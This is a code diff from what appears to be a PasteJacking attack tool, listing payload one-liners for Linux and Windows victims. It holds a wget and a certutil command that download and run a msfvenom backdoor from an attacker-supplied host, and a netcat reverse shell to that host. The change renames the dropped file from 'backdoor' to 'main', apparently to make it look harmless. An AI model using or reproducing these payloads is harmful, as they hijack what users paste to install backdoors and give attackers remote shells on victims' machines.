@@ -2,11 +2,11 @@ from . import settings, utils
 from .color import *
 import copy
 
-linux = { "Download and execute a msfvenom backdoor using wget (Web delivery + PasteJacking)":"wget http://{ip}:{port}/backdoor.elf &> /dev/null && chmod +x ./backdoor.elf && ./backdoor.elf & disown",
+linux = { "Download and execute a msfvenom backdoor using wget (Web delivery + PasteJacking)":"wget http://{ip}:{port}/main.elf &> /dev/null && chmod +x ./main.elf && ./main.elf & disown",
           "Get me a simple reverse connection using netcat (Reverse connection + PasteJacking)":"nc -e /bin/sh {ip} {port} & disown",
           "Only serve my custom one-liner and do your PasteJacking thing! (PasteJacking only!)":None
 }
-windows = { "Download and execute a msfvenom backdoor using certutil (Web delivery + PasteJacking)":"certutil.exe -urlcache -split -f http://{ip}:{port}/backdoor.exe backdoor.exe 2>&1 && backdoor.exe",
+windows = { "Download and execute a msfvenom backdoor using certutil (Web delivery + PasteJacking)":"certutil.exe -urlcache -split -f http://{ip}:{port}/main.exe main.exe 2>&1 && main.exe",
             "Only serve my custom one-liner and do your PasteJacking thing! (PasteJacking only!)":None
 }
 
